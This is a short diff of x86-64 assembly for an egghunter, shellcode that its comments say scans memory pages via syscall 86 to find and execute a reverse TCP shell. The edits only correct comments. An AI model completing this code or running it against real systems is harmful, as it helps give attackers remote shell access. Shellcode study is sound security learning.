@@ -23,7 +23,7 @@ _start:
 	; and then jump into, and execute
 	; our reverse TCP shellcode
 	;
-	; we'll try this out with the uselib syscall 86
+	; we'll try this out with the link syscall 86
 	; and hope we can find and execute our shell
 	; in the data section
 
@@ -44,7 +44,7 @@ hunter:
 	mov al, 0x56			; #define __NR_link       86 (0x56)	
 	xor rsi, rsi
 	syscall				; call it
-	cmp al, 0xf2			; compare the return value in eax
+	cmp al, 0xf2			; compare the return value in rax
 	jz page_alignment		; short jump to next page if ZF set
 	mov rax, 0x656d72656b636168	; copy our comparison string into eax
 	mov rdi, rdx			; mov our value in rdx into rdi
